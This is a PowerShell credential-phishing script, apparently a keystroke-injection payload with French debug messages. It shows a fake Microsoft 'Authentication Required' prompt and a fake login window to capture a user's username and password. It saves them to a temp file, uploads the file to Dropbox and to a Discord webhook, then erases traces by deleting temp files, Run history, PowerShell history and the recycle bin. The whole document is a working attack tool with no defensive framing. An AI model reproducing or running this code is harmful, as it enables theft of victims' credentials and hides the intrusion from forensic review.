function Get-Creds {
    Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
    
    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Failed Authentication" 
        WindowStartupLocation="CenterScreen"
        ResizeMode="NoResize"
        Width="400" Height="220"
        Topmost="True"
        Background="#F0F0F0">
    <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="350">
        <TextBlock Text="Failed Authentication" FontSize="16" FontWeight="Bold" Margin="0,0,0,20" Foreground="#333"/>
        <TextBlock Text="Entrez vos informations d'identification." Margin="0,0,0,20" TextWrapping="Wrap"/>
        
        <TextBlock Text="Username:" Margin="0,0,0,5" Foreground="#333"/>
        <TextBox x:Name="UsernameBox" Padding="8" Height="35" Margin="0,0,0,15" Background="White"/>
        
        <TextBlock Text="Password:" Margin="0,0,0,5" Foreground="#333"/>
        <PasswordBox x:Name="PasswordBox" Padding="8" Height="35" Margin="0,0,0,20" Background="White"/>
        
        <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" Margin="0,0,0,0">
            <Button x:Name="OkButton" Content="OK" Width="70" Height="35" Margin="0,0,10,0" Background="#0078D4" Foreground="White" Cursor="Hand"/>
            <Button x:Name="CancelButton" Content="Cancel" Width="70" Height="35" Background="#E5E5E5" Cursor="Hand"/>
        </StackPanel>
    </StackPanel>
</Window>
"@
    
    $reader = [System.Xml.XmlNodeReader]::new([xml]$xaml)
    $window = [System.Windows.Markup.XamlReader]::Load($reader)
    
    $usernameBox = $window.FindName("UsernameBox")
    $passwordBox = $window.FindName("PasswordBox")
    $okButton = $window.FindName("OkButton")
    $cancelButton = $window.FindName("CancelButton")
    
    $script:result = $null
    
    $okButton.Add_Click({
        if ([string]::IsNullOrWhiteSpace($usernameBox.Text) -or [string]::IsNullOrWhiteSpace($passwordBox.Password)) {
            [System.Windows.MessageBox]::Show("Credentials cannot be empty!", "Error", "Ok", "Stop") | Out-Null
        }
        else {
            $script:result = @{
                Username = $usernameBox.Text
                Password = $passwordBox.Password
            }
            $window.Close()
        }
    })
    
    $cancelButton.Add_Click({
        $window.Close()
    })
    
    $window.ShowDialog() | Out-Null
    
    if ($script:result) {
        Write-Host "DEBUG: Credentials récupérées avec succès" -ForegroundColor Green
        return $script:result
    }
    else {
        Write-Host "Annulé par l'utilisateur" -ForegroundColor Red
        return $null
    }
}

#----------------------------------------------------------------------------------------------------

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

if ($caps -eq $true){
$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}

#----------------------------------------------------------------------------------------------------

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'

Write-Host "DEBUG: Avant MessageBox" -ForegroundColor Yellow

try {
    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
    Write-Host "DEBUG: Après MessageBox, Result = $Result" -ForegroundColor Yellow
}
catch {
    Write-Host "ERROR dans MessageBox: $_" -ForegroundColor Red
    exit
}

Write-Host "DEBUG: Avant Get-Creds" -ForegroundColor Yellow

try {
    $creds = Get-Creds
    Write-Host "DEBUG: Après Get-Creds" -ForegroundColor Yellow
}
catch {
    Write-Host "ERROR dans Get-Creds: $_" -ForegroundColor Red
    exit
}

if ($creds -eq $null) {
    Write-Host "Pas de credentials, arrêt du script" -ForegroundColor Red
    exit
}

Write-Host "DEBUG: Credentials obtenues, suite du script..." -ForegroundColor Yellow

#------------------------------------------------------------------------------------------------------------------------------------

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
